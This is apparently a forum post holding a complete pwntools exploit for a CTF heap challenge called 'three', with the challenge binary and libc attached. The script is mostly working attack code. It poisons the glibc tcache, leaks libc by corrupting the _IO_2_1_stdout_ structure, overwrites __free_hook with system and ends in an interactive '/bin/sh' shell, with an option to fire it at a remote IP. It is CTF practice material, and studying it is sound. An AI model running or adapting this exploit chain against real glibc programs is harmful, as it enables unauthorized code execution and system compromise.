
```from pwn import *

context.log_level = 'debug'

import random,struct

debug = 1

if debug:

    p = process('./three')#env={'LD_PRELOAD':'./libc.so.6'}

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else:

    p=remote('39.96.13.122',9999)

    libc = ELF('./libc.so.6')



def add(content):

    p.sendlineafter("Your choice:",'1')

    p.sendafter("Input the content:",content)



def edit(idx,content):

    p.sendlineafter("Your choice:",'2')

    p.sendlineafter("Input the idx:",str(idx))

    p.sendafter("Input the content:",content)



def dele(idx,c):

    p.sendlineafter("Your choice:",'3')

    p.sendlineafter("Input the idx:",str(idx))

    p.sendlineafter("Clear?(y/n):",c)



def get_base(p1):

    f = open('/proc/'+str(pidof(p1)[0])+'/maps','r')

    while 1:

        tmp = f.readline()

        print tmp

        if 'libc-2.26.so' in tmp:

            libc_addr = int('0x'+tmp.split('-')[0],16)                    

            f.close()

            break

    print '[+] libc_addr :',hex(libc_addr)

    return libc_addr

#for unsortedbin check inuse

add('0'*0x3f+'\n')

add('0'*0x3f+'\n')

add('1'*8+p64(0x21)+p64(0)*3+p64(0x21))

dele(2,'y')

dele(1,'y')

dele(0,'y')



add(p64(0)*3+p64(0x91)+p64(0)+'\n')#0 260;make 280'size = 0x91

add('0gur1\n')#1 2b0

dele(1,'y')#tcache 0x50->2b0

dele(0,'n')#tcache 0x50->260->2b0



edit(0,'\x80')#tcache 0x50->260->280



add('1gur1\n')#1->0 260

add('2gur1\n')#2->0+0x20 280



dele(2,'n')

dele(2,'n')

dele(2,'n')

dele(2,'n')

dele(2,'n')

dele(2,'n')

dele(2,'n')#tcache 0x90 full with 280



edit(0,p64(0)*3+p64(0x51))#change 280's size to 0x51

dele(1,'y')#tcache 0x50->260

dele(2,'n')#tcache 0x50->280->260



edit(0,p64(0)*3+p64(0x91))#change 280's size to 0x91

dele(2,'y')#put 280 in unsortedbin;tcache 0x50->280->main+88



if debug:

    libc_base = get_base(p)

    stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']



    d = (stdout_addr)&0xffff

    c = struct.pack('cc',chr(d&0xff),chr(d>>8&0xff))



    edit(0,p64(0)*3+p64(0x91)+c)#tcache 0x50->280->&stdout



else:



    edit(0,p64(0)*3+p64(0x91)+'\x60\xf7')#tcache 0x50->280->&stdout



add('1gur1\n')#1->280

if debug:

    add(p64(0xfbad1800)+p64(0)*3+'\x40')#2->&stdout,edit stdout's flag and pointer

else:

    add(p64(0xfbad1800)+p64(0)*3+'\x80')#2->&stdout,edit stdout's flag and pointer

#puts leak libc address

libc_addr = u64(p.recv(8))-0x20-libc.symbols['_IO_2_1_stdout_']

log.info("libc_addr:%#x",libc_addr)

free_hook = libc_addr +libc.symbols['__free_hook']

sys_addr = libc_addr +libc.symbols['system']





edit(0,p64(0)*3+p64(0x51))#change 280's size to 0x51

dele(1,'y')#tcache 0x50->280

edit(0,p64(0)*3+p64(0x51)+p64(free_hook))#tcache 0x50->280->free_hook

add('1gur1\n')#1->280



edit(0,'/bin/sh\0'+p64(0)*2+p64(0x61))#change 280's size t0 0x61,not to put into tacache 0x50;tcache 0x50 ->free_hook

dele(1,'y')#tcache 0x60->280;tcache 0x50 ->free_hook

add(p64(sys_addr))#write free_hook to system



p.sendlineafter("Your choice:",'3')

p.sendlineafter("Input the idx:",str(0))





p.interactive()

```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-1-28 16:28 被oguri编辑，原因：发现错误

上传的附件：

- [`three`](javascript:void(0);)（12.90kb，23次下载）
- [`libc.so.6`](javascript:void(0);)（1.94MB，24次下载）
